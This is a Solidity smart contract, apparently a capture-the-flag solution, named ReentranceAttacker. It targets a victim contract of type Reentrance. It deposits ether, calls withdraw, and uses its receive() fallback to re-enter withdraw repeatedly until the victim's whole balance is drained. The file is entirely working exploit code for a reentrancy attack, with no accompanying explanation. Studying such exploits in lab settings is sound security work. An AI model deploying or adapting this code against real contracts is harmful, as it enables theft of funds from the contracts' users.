  
  pragma solidity ^0.8.0;

  import "./vic.sol";

  contract ReentranceAttacker {
      Reentrance public reenter;
      uint256 initialDeposit;

      constructor(address payable _victim) {
          reenter = Reentrance(payable(_victim));
      }

      function attack() external payable {
          require(msg.value >= 1 ether, "send >= 1 ether");

          
          initialDeposit = msg.value;
          reenter.donate{value: initialDeposit}(address(this));

          
          callWithdraw();
      }

      receive() external payable {
          
          callWithdraw();
      }

      function callWithdraw() private {
          
          uint256 challengeTotalRemainingBalance = address(reenter).balance;
          
          bool keepRecursing = challengeTotalRemainingBalance > 0;

          if (keepRecursing) {
              
              uint256 toWithdraw =
                  initialDeposit < challengeTotalRemainingBalance
                      ? initialDeposit
                      : challengeTotalRemainingBalance;
              reenter.withdraw(toWithdraw);
          }
      }
  }
